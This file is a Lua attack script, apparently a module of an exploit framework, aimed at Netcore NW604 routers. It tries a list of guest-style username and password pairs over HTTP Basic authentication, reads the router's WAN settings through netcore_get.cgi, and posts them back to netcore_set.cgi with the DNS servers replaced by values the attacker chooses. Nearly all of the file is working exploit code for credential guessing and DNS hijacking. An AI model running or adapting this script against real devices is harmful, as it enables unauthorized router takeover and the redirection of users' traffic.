
local http = require "socket.http"
local socket = require "socket"
local ltn12 = require "ltn12"
local mime = require "mime"


info={}
info["expID"] = 10013     -- 具体的攻击ID必须10000以上
info["name"] = "netcore NW604 DNS Change"
info["authors"] = "Tian HongYu "
info["description"] = "Change DNS setting by password"
info["references"] = ""
info["devices"] = "netcore NW604"
info["version"] = 1
info["type"] = ""


attackInfo={}
attackInfo["target"] = "192.168.1.1"
attackInfo["port"] = 80
attackInfo["dns1"] = "8.8.4.4"
attackInfo["dns2"] = "1.1.1.1"



account_pass = {}
account_pass["GUEST"] = "GUEST"
account_pass["GUFST"] = "GUEST"
account_pass["guest"] = "guest"
account_pass["guesT"] = "Guest"
account_pass["Guest"] = "guest"
account_pass["gUEST"] = "gUEST"
account_pass["gueST"] = "GuesT"
account_pass["guEst"] = "gu est"
account_pass["gUest"] = "gu st"
account_pass["12345"] = "12345"
account_pass["guest12345"] = "guest12345"


function get_args()
    local response_body = {}
	local before_auth = "Basic "
	for k,v in pairs(account_pass) do
		res =  mime.b64(k..":"..v)
		auth = before_auth..res
		local res,code,response_headers= http.request{
			url = "http://192.168.1.1/cgi-bin-igd/netcore_get.cgi",
			headers = {
					["Content-Length"] = 27,
					["Authorization"] = auth,
			},
			sink = ltn12.sink.table(response_body)
		}
		res = table.concat(response_body)
		if res ~= "" then
			return auth,res
		end
	end
end



function split( str,reps)
    local resultStrList = {}
    string.gsub(str,'[^'..reps..']+',function ( w )
        table.insert(resultStrList,w)
    end)
    return resultStrList
end



function get_value(list,char)
    for i,k_v in pairs(list) do
        if string.find(k_v,char) then
            local b = split(k_v,":")
            for i,mix_value in pairs(b) do
                if mix_value == "'"..char.."'" then
                    local str_value = split(b[2],"'")
                    for i,value in pairs(str_value) do
                        return value
                    end
                end
            end
        end
    end
end



function post_new_args(info,auth)
    local response_body = {}
    local request_body = "conntype=3&wan_ip="..info["wan_ip"].."&wan_mask="..info["wan_mask"].."&wan_gw="..info["wan_gw"].."&dns_a="..attackInfo["dns1"].."&dns_b="..attackInfo["dns2"].."&sec_mode="..info["sec_mode"].."&mac_addr="..info["mac_addr"].."&shortcut=shortcut"
    local url = "http://"..attackInfo["target"]..":"..attackInfo["port"].."/cgi-bin-igd/netcore_set.cgi"

    local res, code, response_headers = http.request{
		url = url,
		method = "POST",
		headers = {
			["Content-Length"] = 27,
			--["Authorization"] = "Basic Z3Vlc3Q6Z3Vlc3Q="
			["Authorization"] = auth
			},

		source = ltn12.source.string(request_body),
        sink = ltn12.sink.table(response_body)
    }

    print(code)
    res = table.concat(response_body)
    if res == '["SUCCESS"]' then
        print("修改dns成功")
    end

end

--错误处理
function errorhandler(err)
	print("Error:",err)
end


function main()
    -- 获取原始参数
    auth,res = get_args()

    -- 按逗号分割字符串
    list = split(res,",")

    -- 取出我们需要的字段的值，并去除值两边的引号
    info = {}
    info["dns_a"] = get_value(list,"dns_a")
    info["dns_b"] = get_value(list,"dns_b")
    info["conntyp"] = get_value(list,"conntyp")
    info["wan_ip"] = get_value(list,"wan_ip")
    info["wan_mask"] = get_value(list,"wan_mask")
    info["wan_gw"] = get_value(list,"wan_gw")
    info["sec_mode"] = get_value(list,"sec_mode")
    info["mac_addr"] = get_value(list,"mac_addr")

    -- 拼接参数，post提交
    post_new_args(info,auth)
	status = xpcall(post_new_args,errorhandler)

end

main()

